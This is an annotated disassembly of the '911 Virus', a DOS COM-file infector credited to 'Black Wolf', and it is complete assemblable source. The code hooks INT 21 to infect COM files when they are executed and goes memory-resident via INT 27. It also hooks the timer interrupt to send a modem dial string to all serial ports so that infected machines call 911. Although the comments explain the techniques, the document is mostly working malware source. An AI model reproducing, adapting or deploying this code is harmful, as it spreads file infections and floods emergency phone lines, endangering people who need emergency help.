;***************************************************************************
;*                                                                         *
;*                              The 911 Virus                              *
;*                   (An "Armagedon the Greek" Variant)                    *
;*   Caution! This Virus Will Dial 911 On Computers Equipped With A Modem! *
;*Dial is controlled off of the new INT 08 handler when virus goes TSR.    *
;*Examine the way the virus goes memory resident using INT 27, this is an  *
;*interesting method that I had not seen before in a virus.  Also, look    *
;*at its rather strange procedure for infecting files.                     *
;*                                                                         *
;*                         Disassembly by Black Wolf                       *
;*                                                                         *
;***************************************************************************
.model tiny                             ;Sets assembler into Tiny mode
.radix 16                               ;Sets numbers to hexidecimal
.code
	org     100

;**************************************************************************
;*                             Loading Jump                               *
;**************************************************************************
start:
		jmp     Virus_Entry

;**************************************************************************


;**************************************************************************
;*              This is where the infected file would usually be.         *
;**************************************************************************
;**************************************************************************


;**************************************************************************
;*                              Int 21 Handler                            *
;**************************************************************************
Int_21:
		pushf
		cmp     ah,0E0          ;Is this an installation check?
		jne     not_check       ;If not, go to not_check
		mov     ax,0DADA        ;If so, return 0DADA
		popf                    ;and exit interrupt.
		iret
  
not_check:
		cmp     ah,0E1          ;0E1=request for virus' seg. address
		jne     not_seg_req     ;Not E1? then go to not_seg_req
		mov     ax,cs           ;Move virus' address into AX
		popf                    ;and exit interrupt.
		iret
not_seg_req:
		cmp     ax,4B00         ;Load and Execute?
		je      Infect          ;Go Infect
Go_Int_21:
		popf

;               jmp     dword ptr cs:[Int_21_Off]  
		db      2e,0ff,2e,22,01            ;Jump to Int 21 (done)
;**************************************************************************


;****************************************************************************
;*                             Main Data Section                            *
;****************************************************************************
Int_21_Off      dw      138dh
Int_21_Seg      dw      029a

Int_08_Off      dw      022Bh
Int_08_Seg      dw      70

Ready_Byte              db      0
Timing_Counter          db      8
save_time_a             db      10
save_time_b             db      9
save_date               db      34
Bytes_Written           dw      0
waste_byte              db      0
Character_Count         db      0
Data_Ready              db      0
Ports_Initialized       db      0 

com             db      'COM'
handle          dw      5
file_size       dw      2
		db      0, 0
mem_allocated   dw      1301
save_ss         dw      12AC
save_sp         dw      0FFFE
filename_seg    dw      9B70
filename_off    dw      3D5Bh
attribs         dw      20
file_date       dw      0EC2
file_time       dw      6E68
		db       0,0,81,0
cs_save_3       dw      12AC
		db       5C,0
cs_save_1       dw      12AC
		db       6C,0
cs_save_2       dw      12AC
;****************************************************************************

Infect:
		push    ds bx si cx ax dx bp es di  ;Save Registers

		cld                             ;Clear direction
		push    dx ds                   ;Save Filename Address
		xor     cx,cx                   ;Zero CX for use as counter
		mov     si,dx                   ;Move Filename Offset to SI

Find_End_Of_Filename:
		mov     al,[si]                 ;Get letter from Filename
		cmp     al,0                    ;Are we at the end of the
		je      Check_Filename          ;Filename? Yes? Go to loc_7
		inc     cx                      ;inc Count
		inc     si                      ;inc pointer to next char
		jmp     short Find_End_Of_Filename

Check_Filename:
		add     dx,cx                   ;add filename length to 
						;start of filename address
		sub     dx,3                    ;Subtract 3 for extension
		mov     si,offset com           ;com='COM'
		mov     di,dx                   ;set di=dx to Check 

						;Next few lines Check for
						;Command.Com

		cmp     byte ptr [di-3],4E      ;Is the second to last letter 
						;an 'N'?
		jne     setup_check             ;If not, it's not COMMAND,
						;Go to loc_8
		cmp     byte ptr [di-2],44      ;Is the last letter a 'D'?
		je      Infect_Error            ;If so, it is COMMAND,
						;Go to Infect_Error.
setup_check:
		mov     cx,3                    ;Setup loop

check_if_com:
		mov     al,cs:[si]
		cmp     al,[di]
		jne     Infect_Error                  
		inc     si                      ;Check for 'COM' Extension
		inc     di                      ;If so, infect, otherwise
		loop    check_if_com            ;Go to Infect_Error
  
		pop     ds
		pop     dx                      ;Restore original filename
		push    dx                      ;address to DS:DX, then 
		push    ds                      ;push them back onto stack

		mov     si,dx
		mov     dl,0

		cmp     byte ptr [si+1],3A      ;Is the second letter a 
						; ':'? I.E. is the file on
						;another drive?

		jne     Get_Free_Disk_Space     ;Nope? Go Get_Free_Disk_Space

		mov     dl,[si]                 ;Get drive number if the file
		and     dl,0F                   ;is on another drive.

Get_Free_Disk_Space:
		mov     ah,36                   
		int     21h                     ;Get free drive space. 
						;DL=drive                                                
		cmp     ax,0FFFF                
		je      Infect_Error
		jmp     short Continue_Infect            
		nop
Infect_Error:
		jmp     Pop_And_Quit_Infect
		jmp     End_Infect                  
Error_After_Open:
		jmp     Close_File
		jmp     Reset_DTA
Continue_Infect:
		cmp     bx,3                    ;If there are less than 3 
		jb      Infect_Error            ;clusters free, quit.        
		
		pop     ds                      ;DS:DX is filename address
		pop     dx                      ;again.
		push    ds
		push    dx
		
		mov     word ptr cs:[filename_seg],ds    ;Save DS:DX again
		mov     word ptr cs:[filename_off],dx

		mov     ax,4300 
		int     21                         ;Get the file attributes
					      
		mov     word ptr cs:[attribs],cx   ;Store attributes
		mov     ax,4301
		xor     cx,cx                      ;Set attributes to zero 
		int     21                         ;to insure write access.
					 
		mov     bx,0FFFF
		mov     ah,48                ;Allocate all free memory
		int     21                   ;by trying to allocate more 
					     ;than the computer possibly can,
		mov     ah,48                ;then using the returned number
		int     21                   ;(free mem) as the amount to
					     ;request.
		
		mov     word ptr cs:[mem_allocated],ax  ;save the segment of  
							;allocated memory
						
		mov     ax,cs               ;point ds to cs
		mov     ds,ax
		mov     dx,offset new_DTA
		mov     ah,1A                   
		int     21                  ;Set DTA to memory after virus
						
		pop     dx
		pop     ds
		mov     ax,3D02 
		clc                         ;clear carry (unneccessary)
		int     21                  ;Open file for read/write access

		jc      Error_After_Open        ;on error go to 
						;Error_After_Open
		mov     bx,ax                   ;move handle to bx
		mov     word ptr cs:[handle],ax ;save file handle
		mov     cx,0FFFF 
		mov     ax,word ptr cs:[mem_allocated] ;Get segment of 
						       ;memory to use 
		mov     ds,ax                   ;point ds to it
		mov     dx,end_main_virus-start
		mov     ah,3F                   
		clc                             ;clear carry
		int     21                      ;Read 0ffff byte from file
						
		jc      Error_After_Open           ;If error go to 
						   ;Error_After_Open
		mov     word ptr cs:[file_size],ax ;save file size 
						   ;(number of bytes read)
		cmp     ax,0E000                
		ja      Error_After_Open         ;File is too large, go to 
						 ;Error_After_Open
		cmp     ax,end_main_virus-start  ;Is file smaller than virus?
		jb      Not_Infected             ;Yes, therefore it isn't
						 ;infected, goto Not_Infected
		mov     si,offset (end_main_virus+1-100)
		add     si,si                   ;Set SI to point to area where
		sub     si,15                   ;the text message would be if
						;file is already infected.
		mov     cx,13                   ;Length of Text_Message
		mov     di,offset Text_Message  ;("Support Your Police")
  
Check_For_Infection:
		mov     al,byte ptr [si]       ;This loop checks for the text
		mov     ah,cs:byte ptr [di]    ;message in the file being 
		cmp     ah,al                  ;examined.  If it's there, it
		jne     Not_Infected           ;jumps to Close_File, 
		inc     si                     ;otherwise it jumps to Not_Infected
		inc     di                     
		loop    Check_For_Infection
  
		jmp     short Close_File            
		nop
Not_Infected:
		mov     ax,4200 
		mov     bx,word ptr cs:[handle] 
		xor     cx,cx                   
		mov     dx,cx
		int     21                      ;Move to beginning of file
						
		jc      Close_File                  
		mov     si,100
		mov     cx,offset (end_main_virus-100)
		xor     di,di                   
		mov     ax,word ptr cs:[mem_allocated]
		mov     ds,ax
  
Copy_Virus:                                     
		mov     al,cs:[si]              ;Copy virus onto file in 
		mov     [di],al                 ;memory. "repnz movsw"
		inc     si                      ;would've worked a lot 
		inc     di                      ;better.
		loop    Copy_Virus
  
		mov     ax,5700
		mov     bx,word ptr cs:[handle] 
		int     21                      ;Get File Date/Time
						
		mov     word ptr cs:[file_time],cx       ;Save File Time
		mov     word ptr cs:[file_date],dx       ;Save File Date
		mov     ax,word ptr cs:[mem_allocated] 
		mov     ds,ax
		mov     si,offset (end_main_virus-100)
		mov     al,[si]                      ;encrypt first storage
		add     al,0Bh                       ;byte.
		mov     [si],al                      
		xor     dx,dx                        
		mov     cx,word ptr cs:[file_size]   ;Calculate new file size           
		add     cx,offset end_main_virus-100        ;(add virus size)
		mov     bx,word ptr cs:[handle]
		mov     ah,40                 
		int     21                           ;Rewrite file
					       
		mov     word ptr cx,cs:[file_time]           
		mov     word ptr dx,cs:[file_date]           
		mov     bx,word ptr cs:[handle]
		mov     ax,5701 
		int     21                     ;Restore File Time
					       
Close_File:
		mov     bx,word ptr cs:[handle]          
		mov     ah,3E                  
		int     21                      ;Close File
						
		push    cs
		pop     ds
Reset_DTA:
		mov     dx,80               
		mov     ah,1A 
		int     21                     ;Reset DTA to default
					    
		mov     ax,word ptr cs:[mem_allocated]          
		mov     es,ax
		mov     ah,49                   
		int     21                      ;Release Allocated Memory
						
		mov     ax,word ptr cs:[filename_seg]           
		mov     ds,ax
		mov     dx,word ptr cs:[filename_off]           
		mov     ax,4301 
		mov     cx,word ptr cs:[attribs]
		int     21                      ;Restore File Date/Time
							
		jmp     short End_Infect            
		nop

Pop_And_Quit_Infect:
		pop     ds 
		pop     dx
		jmp     short End_Infect
		nop
End_Infect:
		pop     di es bp dx ax cx si bx ds
		jmp     Go_Int_21
		
;************************************************************************  
;*                      Timer Click (INT 8) Handler                     *
;*                      This is Used to Dial Numbers                    *
;************************************************************************
Int_08:
		push    bp ds es ax bx cx dx si di
		
		pushf                              ;Push flags
		;call    word ptr cs:[Int_08_Off]  ;Run old timer click
		db      2e,0ff,1e,26,01
		
		call    Timing_Routine

		push    cs
		pop     ds
		mov     ah,5
		mov     ch,byte ptr [save_time_a]
		cmp     ah,ch
		ja      Quit_Int_08
						;if [save_time_a] !=6, quit.
		mov     ah,6                    
		cmp     ah,ch
		jb      Quit_Int_08
		
		mov     ah,byte ptr [Ready_Byte]
		cmp     ah,1
		je      Go_Dial
		
		mov     ah,1
		mov     byte ptr [Ready_Byte],ah
		jmp     short Quit_Int_08
		nop

Go_Dial:
		call    Write_Ports
		
		inc     word ptr [Bytes_Written]
		mov     ax,word ptr [Bytes_Written]
		cmp     ax,21C 
		jne     Quit_Int_08
		xor     ax,ax                        ;Reset Counters
		mov     byte ptr [Ready_Byte],ah
		mov     word ptr [Bytes_Written],ax
		mov     byte ptr [Data_Ready],ah
Quit_Int_08:
		pop     di si dx cx bx ax es ds bp
		iret

;****************************************************************************  
;*                          Timing Routine For Dialing                      *    
;****************************************************************************  
  
  
Timing_Routine:
		push    cs
		pop     ds

		xor     al,al     
		mov     ah,byte ptr [Timing_Counter]
		cmp     ah,11 
		jne     Inc_Time_Count                  
		mov     ah,byte ptr [save_date] 
		cmp     ah,3bh                  
		jne     Inc_Saved_Date                  
		mov     ah,byte ptr [save_time_b]
		cmp     ah,3bh                  
		jne     Inc_S_T_B                  
		mov     ah,byte ptr [save_time_a]
		cmp     ah,17 
		jne     Inc_S_T_A       
		
		mov     byte ptr [save_time_a],al
Save_T_B:
		mov     byte ptr [save_time_b],al
Store_Save_Date:
		mov     byte ptr [save_date],al
Time_Count:
		mov     byte ptr [Timing_Counter],al
		ret
Inc_Time_Count:
		inc     byte ptr [Timing_Counter]
		ret
Inc_Saved_Date:
		inc     byte ptr [save_date]
		jmp     short Time_Count
Inc_S_T_B:
		inc     byte ptr [save_time_b]
		jmp     short Store_Save_Date
Inc_S_T_A:
		inc     byte ptr [save_time_a]
		jmp     short Save_T_B

dial_string         db      '+++aTh0m0s7=35dp911,,,,,,,' ;Dial string To call 
							 ;911 and wait
  
;****************************************************************************  
;*                        Write Data to Com Ports                           *      
;****************************************************************************  

Write_Ports:
		mov     al,byte ptr [Data_Ready]
		cmp     al,1
		je      Ret_Write_Ports              ; Jump if equal
		
		mov     al,byte ptr [Ports_Initialized] ;Have Ports been 
		cmp     al,1                            ;Initialized yet?
		je      Already_Initialized
		
		mov     cx,3
Init_Ports:
		mov     dx,cx                   
		xor     ah,ah                   
		mov     al,83                   ;Init Comport
		int     14                      ;1200 Baud, No Parity,
						;1 Stop Bit, 8 bit Word Len.
		loop    Init_Ports              ;Initalize all Ports 1-4

  
		mov     al,1
		mov     byte ptr [Ports_Initialized],al
		
		jmp     short Ret_Write_Ports        
		nop

Already_Initialized:
		push    cs
		pop     ds
		mov     si,offset dial_string
		mov     al,byte ptr [Character_Count]
		cmp     al,1A 
		jne     Write_From_SI_To_Ports                  
		jmp     short Setup_write
		nop

Write_From_SI_To_Ports:
		xor     ah,ah
		add     si,ax
		mov     al,[si]
		mov     dx,3F8                  ;Outport from SI to standard
		out     dx,al                   ;addresses of ports 1-4
		mov     dx,2F8                  ;and increment character count
		out     dx,al
		mov     dx,2E8 
		out     dx,al
		mov     dx,3E8 
		out     dx,al
		inc     byte ptr [Character_Count]
		jmp     short Ret_Write_Ports
		nop

Setup_write:
		mov     cx,3
Write_To_All_Ports:
		mov     dx,cx
		mov     al,0dh
		mov     ah,1
		int     14                      ;Write a 1 to all ports
		loop    Write_To_All_Ports
  
		mov     ax,1
		mov     byte ptr [Data_Ready],al
		mov     byte ptr [Character_Count],ah
		mov     byte ptr [Ports_Initialized],ah
  
Ret_Write_Ports:
		ret

;****************************************************************************
;                        Virus Entry Point
;****************************************************************************

Virus_Entry:
		mov     ah,0e0 
		int     21                      ;Check for Installation
		cmp     ax,0dada                ;Was it installed?
		jne     Install_Virus           ;No? Then install it.
		jmp     Already_Installed       ;Yes? Go to Already_Installed
Install_Virus:
		push    cs
		pop     ds
		mov     ax,3521                     ;Get Int 21 Address
		int     21 

		mov     word ptr [Int_21_Off],bx    ;Save old Int 21 
		mov     word ptr [Int_21_Seg],es    ;Vector
		mov     dx,offset Int_21
		mov     ax,2521 
		int     21                          ;Set Int 21

		mov     ax,3508 
		int     21                          ;Get Int 8 Address
						
		mov     word ptr [Int_08_Off],bx      
		mov     word ptr [Int_08_Seg],es    ;Save old Vectors     
		mov     dx,offset Int_08
		mov     ax,2508         
		int     21                          ;Set Int 08

		mov     ah,2C 
		int     21                          ;Get Time
						
		mov     byte ptr [save_time_a],ch
		mov     byte ptr [save_time_b],cl  ;Save Time and Date
		mov     byte ptr [save_date],dh

		mov     ax,cs:[2c]              ;Get environment block 
		mov     ds,ax                   ;address and put it in DS
		xor     si,si                   ;DS:SI=beginning of Env. B.
Find_The_Filename:
		mov     al,[si]                 ;Search through environment
		cmp     al,1                    ;block for program executed.
		je      Found_Filename
		inc     si
		jmp     short Find_The_Filename

Found_Filename:
		inc     si
		inc     si
		mov     dx,si                 ;DS:DX = Filename
		mov     ax,cs
		mov     es,ax                 ;Set segment (ES) = CS  
		mov     bx,5a                 ;Request 5a0h (1440 dec) bytes
		mov     ah,4a        
		int     21                    ;Change Allocated Memory
				     
		mov     bx,word ptr cs:[81]   ;Beginning of Command Line
		mov     ax,cs
		mov     es,ax                 ;set ES=CS again.
		mov     word ptr cs:[cs_save_1],ax
		mov     word ptr cs:[cs_save_2],ax   ;Re-Execute program
		mov     word ptr cs:[cs_save_3],ax   ;To make Int 27 cause
		mov     ax,4B00                      ;program to go mem-res   
		mov     word ptr cs:[save_ss],ss     ;without terminating
		mov     word ptr cs:[save_sp],sp     ;regular program.
		pushf                                
		;call    far cs:[Int_21_Off]         ;Call Load and Execute
		db      2e,0ff,1e,22,01

		mov     ax,word ptr cs:[save_ss]
		mov     ss,ax
		mov     ax,word ptr cs:[save_sp]        ;Restore Stack
		mov     sp,ax
		mov     ax,cs
		mov     ds,ax
		mov     dx,537                 ;DX=End of virus
		int     27                     ;Terminate & stay resident
Already_Installed:
		mov     ah,0E1                  ;Get CS of virus in memory
		int     21      
		mov     si,offset Install_Jump
		mov     cs:[si+3],ax            ;Setup Jump
		mov     ax,offset After_Jump
		mov     cs:[si+1],ax
		mov     ax,word ptr cs:[file_size]
		mov     bx,cs

Install_Jump:
		db      0ea
IP_For_Jump     db      0,0
CS_For_Jump     db      0,0

After_Jump:
		mov     cx,ax  
		mov     ds,bx
		mov     si,100
		mov     di,offset storage_bytes

Restore_File:                       ;Restore File in memory 
		mov     al,[di]
		mov     [si],al
		inc     si
		inc     di
		loop    Restore_File
  
		mov     si,offset return_jump
		mov     cs:[si+3],ds              ;set host segment
		mov     al,byte ptr ds:[100]      ;Get first byte of host,
		sub     al,0bh                    ;then unencrypt first byte
		mov     byte ptr ds:[100],al      ;of Storage_Bytes
		mov     ax,ds                     ;and restore it
		mov     es,ax                     ;restore ES and SS to point
		mov     ss,ax                     ;to DS/CS

;*              jmp     far ptr start            ;Return control to COM file
return_jump:
		db      0ea
host_offset     db      00,01
host_segment    db      07,13

Text_Message    db      'Support Your Police'

end_main_virus:
Storage_Bytes   db      0D8,20                    ;First Byte Encrypted

end_of_vir:
word_space      db      8 dup (?)

new_DTA :
end     start
